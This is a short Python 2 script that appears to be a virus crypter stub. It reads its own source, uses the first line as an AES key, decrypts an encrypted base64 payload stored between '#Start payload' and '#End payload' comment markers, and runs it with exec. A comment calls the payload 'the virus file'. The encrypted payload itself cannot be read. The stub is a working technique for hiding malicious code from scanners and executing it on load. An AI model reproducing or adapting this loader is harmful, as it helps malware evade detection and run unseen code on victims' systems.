print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload